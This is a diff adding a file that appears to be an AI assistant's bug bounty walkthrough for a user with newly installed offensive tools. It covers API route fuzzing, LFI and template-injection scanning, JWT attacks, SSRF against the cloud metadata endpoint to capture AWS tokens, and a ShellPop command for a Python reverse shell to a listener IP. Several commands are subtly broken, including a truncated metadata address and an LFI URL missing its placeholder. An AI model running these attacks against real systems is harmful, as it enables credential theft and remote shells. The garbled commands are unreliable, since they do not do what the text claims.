@@ -1,0 +1,85 @@
+To legally test a system for a bug bounty program and earn a financial reward, you must follow a structured methodology that maps your newly installed tools to specific vulnerabilities. Always stick strictly to the program's defined Scope (allowed domains) and Rules of Engagement (no Denial of Service).
+Here is an end-to-end workflow utilizing the toolset you just built.
+------------------------------
+## Step 1: Active Reconnaissance & API Mapping
+Before exploiting anything, you need to map out the application's hidden attack surface. APIs and hidden routing parameters are the highest-yield targets.
+## Action: Hunt for Hidden Endpoints with Kiterunner
+Run Kiterunner against your target domain to fuzz for undocumented API paths, administrative routes, or legacy versions (like /api/v1/debug or /actuator):
+
+kr scan https://bounty.com -A=apiroutes-210228:20000 --fail-status-codes 403,404,500
+
+
+* What to look for: Keep an eye out for unexpected 200 OK or 401 Unauthorized responses on pathways containing words like admin, config, v2, or internal.
+
+------------------------------
+## Step 2: Vulnerability Detection (Fuzzing Inputs)
+Once you map out the active URL parameters (e.g., ?page=, ?file=, or ?name=), you can look for common web bugs using automated scanners.
+## Action A: Scan for Local File Inclusion (LFI)
+If you found parameters that fetch files or load templates, open LFISuite:
+
+lfisuite
+
+
+   1. Select Option 2) Scanner.
+   2. Provide your target URL using the LFI placeholder keyword:
+   
+   http://bounty.com
+   
+   3. Look for file leak responses containing system configurations (like /etc/passwd or boot configuration paths).
+
+## Action B: Scan for Server-Side Template Injection (SSTI)
+If an endpoint reflects input back to the user interface (like a profile name or email template generator), test it for template execution flaws with SSTImap or Tplmap:
+
+sstimap.py -u "http://bounty.com"
+
+
+* What to look for: The tool checks if typing mathematical variables (like ${7*7}) forces the server to calculate and output the results (49), indicating code injection space.
+
+------------------------------
+## Step 3: Identity & Access Token Cracking
+If your target application utilizes tokens to track login authentication states across its subdomains, scrutinize the formatting of those strings.
+## Action: Deconstruct Tokens with JWT_Tool
+If the target passes a JSON Web Token inside its HTTP Authorization: Bearer <TOKEN> header, capture it and analyze it using your JWT_Tool setup:
+
+jwt_tool <YOUR_TARGET_JWT> -M pb
+
+
+* What to look for: This automated security playbook will look for major configuration flaws, such as the None algorithm vulnerability or key confusion variants, which can allow you to edit your user permissions to "isAdmin": true.
+
+------------------------------
+## Step 4: Exploitation & Proof of Concept (PoC)
+In bug bounties, you must show the impact of a vulnerability to get paid. If you discover a critical hole like SSRF, use your tunneling utilities to prove access to internal networks safely.
+## Action A: Exploit SSRF safely with SSRF_Proxy
+If you discover a parameter that fetches URLs (like a profile photo uploader or webpage link preview module), spin up your SSRF Proxy:
+
+ssrf-proxy -u "http://bounty.com"
+
+Then use curl through your local listener (127.0.0.1:8081) to show that you can reach the target cloud server's local metadata configuration endpoint:
+
+curl --proxy http://127.0.0.1:8081 http://169.254.169
+
+
+* Bounty Tip: Capturing cloud AWS access tokens through SSRF usually guarantees a Critical/High severity payout.
+
+## Action B: Safely staging a Reverse Shell
+If an SSTI or LFI vulnerability gives you complete remote code execution capabilities, generate a quick interactive payload template using ShellPop to document the shell impact cleanly:
+
+shellpop --payload python/reverse_tcp --host <YOUR_LISTENER_IP> --port 4444 --clip
+
+
+* Note: When submitting your bug bounty report, provide the exact generated string text as proof of execution rather than leaving a persistent background shell running on their assets.
+
+------------------------------
+## The Bug Bounty Reporting Checklist
+When you find a bug, write a professional report containing these three core details to ensure quick triaging and payout:
+
+   1. Vulnerability Description: What is the bug? (e.g., Broken Object Level Authentication on API endpoints).
+   2. Steps to Reproduce: Provide step-by-step terminal instructions with the exact flags/inputs used so their team can repeat your findings.
+   3. Impact: Explain what an attacker could do (e.g., Allows unauthenticated users to view private financial transaction records).
+
+To help narrow down your focus, let me know:
+
+* Are you currently targeting a web application, a mobile API, or an external cloud network architecture?
+* Do you need a template for drafting a vulnerability disclosure report?
+
+
